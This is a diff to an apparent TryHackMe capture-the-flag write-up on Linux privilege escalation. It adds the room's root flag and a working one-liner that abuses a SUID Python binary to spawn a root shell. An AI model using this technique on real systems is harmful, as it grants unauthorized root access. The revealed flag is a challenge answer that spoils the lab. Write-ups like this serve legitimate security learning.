@@ -20,7 +20,7 @@
 6. Search for files with SUID permission, which file is weird?
 `/usr/bin/python`
 7. root.txt (flag)?
-``
+`THM{pr1v1l3g3_3sc4l4t10n}`
 ---
 
 ## Obtained Information 🔍
@@ -98,6 +98,16 @@ I wanted to exclude a lot of "Permission denied" files. The answer for the quest
 If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.
 ```
 
+So we run found script:
+```bash
+$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+whoami  
+root
+```
+
+Now we have access to root folder where we should find our second flag and answer to last question.
+
+8. Flag found at root dir.
 
 ---
 
@@ -111,6 +121,6 @@ If the binary has the SUID bit set, it does not drop the elevated privileges and
 
 - learned that we can search for files that needs root permission 
 - What is SUID (/4000)
-- learned about GTFOBins
+- learned about GTFOBins and using binary files to escalate privileges (earlier thought that /bin means some container, like trash bin 🤣)
 
 ---
